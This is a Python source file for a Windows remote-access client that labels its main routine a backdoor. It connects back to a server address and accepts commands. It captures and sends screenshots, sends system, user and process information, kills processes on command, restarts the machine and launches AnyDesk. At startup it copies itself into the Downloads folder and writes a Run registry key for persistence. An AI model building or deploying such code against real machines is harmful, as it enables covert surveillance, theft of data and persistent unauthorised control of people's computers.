import socket
import colorama
from termcolor import colored
import subprocess
import threading
from datetime import datetime
import random
import socket
import time
import os
import sys
import struct
import winreg
import shutil
import psutil
import win32gui


class Client:
    def __init__(self, server):
        self.server_host = server[0]
        self.server_port = server[1]
        self.buffer_size = 16184
        self.d = datetime.now()
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        self.hostname = socket.gethostname()
        self.localIP = str(socket.gethostbyname(self.hostname))

    def connection(self):
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        while True:
            time.sleep(1)
            print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
            try:
                soc.connect((self.server_host, self.server_port))
                self.backdoor(soc)

            except (TimeoutError, WindowsError, ConnectionAbortedError) as e:
                print(colored(e, 'red'))
                break

    def backdoor(self, soc):
        # Send Computer Name to Server
        ident = self.hostname
        soc.send(ident.encode())

        # Wait For Commands
        message = soc.recv(self.buffer_size).decode()
        print(f"{colored(message, 'green')}")

        while True:
            command = soc.recv(self.buffer_size).decode()
            try:
                if len(str(command)) == 0:
                    print(colored("[!]Disconnected!", 'red'))
                    break

                # Capture Screenshot
                elif str(command.lower()[:6]) == "screen":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.filename = \
                        rf"c:\Users\{os.getlogin()}\Desktop\screenshot {self.hostname} {str(self.localIP)} {self.dt}.jpg"
                    path = rf'c:\Users\{os.getlogin()}\Desktop\screenshot.ps1'
                    with open(path, 'w') as file:
                        file.write("Add-Type -AssemblyName System.Windows.Forms\n")
                        file.write("Add-Type -AssemblyName System.Drawing\n\n")
                        file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
                        file.write("$Width  = $Screen.Width\n")
                        file.write("$Height = $Screen.Height\n")
                        file.write("$Left = $Screen.Left\n")
                        file.write("$Top = $Screen.Top\n\n")
                        file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
                        file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
                        file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
                        file.write(rf"$bitmap.Save('{self.filename}')")

                    time.sleep(0.2)

                    ps = subprocess.Popen(["powershell.exe", rf"{path}"], stdout=sys.stdout)
                    ps.communicate()
                    soc.send(f"{self.filename}".encode())
                    # self.send_files(soc)
                    chunk = 1000000
                    sysinfo = open(self.filename, 'rb')
                    msg = soc.recv(1024).decode()
                    print(msg)

                    while True:
                        data = sysinfo.read(chunk)
                        soc.sendall(data)

                        if not data:
                            sysinfo.close()
                            break

                    msg = soc.recv(1024).decode()
                    print(f"@Server: {msg}")
                    soc.send(f"@{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
                    os.remove(self.filename)
                    os.remove(path)

                # Get System Information & Users
                elif str(command.lower()[:2]) == "si":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.systeminfofile = rf"c:\Users\{os.getlogin()}\Desktop\systeminfo " \
                                          rf"{self.hostname} {str(self.localIP)} {self.dt}.txt"

                    # self.boot_time(soc, systeminfofile)
                    sysinfo = open(self.systeminfofile, 'w')
                    sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
                    sysinfo.write("\n")
                    allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
                    sysinfo.close()
                    soc.send(f"{self.systeminfofile}".encode())

                    time.sleep(2)
                    sysinfo = open(self.systeminfofile, 'r')
                    while True:
                        data = sysinfo.read(1024)
                        soc.sendall(data.encode())

                        if not data:
                            sysinfo.close()
                            break

                    # soc.shutdown(1)
                    msg = soc.recv(1024).decode()
                    print(f"@Server: {msg}")
                    soc.send(f"@{self.hostname} | {self.localIP}: System Information Sent.\n".encode())
                    os.remove(self.systeminfofile)

                    continue

                # Get Last Restart Time
                elif str(command).lower()[:2] == "lr":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    last_reboot = psutil.boot_time()
                    soc.send(f"@{self.hostname} | {self.localIP}: "
                             f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}".encode())
                    continue

                # Get Current Logged-on User
                elif str(command).lower()[:4] == "user":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    current_user = os.getlogin()
                    soc.send(f"@{self.hostname} | {self.localIP}: Current User: {current_user}.\n".encode())
                    continue

                # Run Anydesk
                elif str(command.lower()[:7]) == "anydesk":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    subprocess.call([r"C:\Program Files (x86)\AnyDesk\anydesk.exe"])
                    continue

                # Task List
                elif (str(command.lower())) == "tasks":
                    chunk = 1000000
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.tasksfile = rf"c:\Users\{os.getlogin()}\Desktop\tasks " \
                                     rf"{self.hostname} {str(self.localIP)} {self.dt}.txt"

                    sysinfo = open(self.tasksfile, 'w')
                    sinfo = subprocess.call(['tasklist'], stdout=sysinfo)
                    sysinfo.write("\n")
                    sysinfo.close()
                    soc.send(f"{self.tasksfile}".encode())

                    with open(self.tasksfile, 'r') as file:
                        for line in file.readlines():
                            task_list.append(line)

                    for t in task_list:
                        print(t)

                    time.sleep(2)
                    sysinfo = open(self.tasksfile, 'r')
                    while True:
                        data = sysinfo.read(chunk)
                        soc.sendall(data.encode())

                        if not data:
                            sysinfo.close()
                            break

                        # soc.shutdown(1)
                    msg = soc.recv(1024).decode()
                    print(f"@Server: {msg}")
                    soc.send(f"@{self.hostname} | {self.localIP}: Task List Sent Sent.\n".encode())
                    os.remove(self.tasksfile)

                    try:
                        # Kill Task
                        kill = soc.recv(1024).decode()
                        if str(kill) == "kill":
                            task2kill = soc.recv(1024).decode()
                            os.system(f'taskkill /IM {task2kill} /F')
                            soc.send(f"Task: {task2kill} Killed.".encode())
                            break

                        else:
                            continue

                    except (ConnectionResetError, ConnectionAbortedError):
                        break

                # Restart Machine
                elif str(command.lower()[:7]) == "restart":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    os.system('shutdown /r /t 1')

                # Close Connection
                elif str(command.lower()) == "exit":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    print(colored('[!]Connection closed by server.', 'yellow'))
                    soc.shutdown(socket.SHUT_RDWR)
                    soc.close()
                    self.connection()

            except Exception as err:
                print(colored(f"Error: {err} \n[!]Connection closed.", 'red'))
                self.connection()

        self.connection()


def persistence(duration):
    time.sleep(duration)
    command = \
        r"Set-Itemproperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' " \
        r"-Name 'MekifRemoteAdmin' -Value 'c:\client.py' -Force"

    run_powershell(command)
    return True


def run_powershell(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed


def window_enumeration_handler(hwnd, top_windows):
    # Add windows to list
    top_windows.append((hwnd, win32gui.GetWindowText(hwnd)))


if __name__ == "__main__":
    task_list = []
    top_windows = []
    script_path = os.path.realpath(__file__)
    script_file_name = os.path.basename(script_path)
    target_path = fr"c:\Users\{os.getlogin()}\Downloads\{str(script_file_name).replace('py', 'exe')}"
    shutil.copyfile(script_path, target_path)
    persistence_thread = threading.Thread(target=persistence,
                                          args=(1,), name='Persistence Thread')
    persistence_thread.start()

    port = 55400
    servers = [('Server-IP', port)]
    while True:
        for server in servers:
            client = Client(server)
            client.connection()
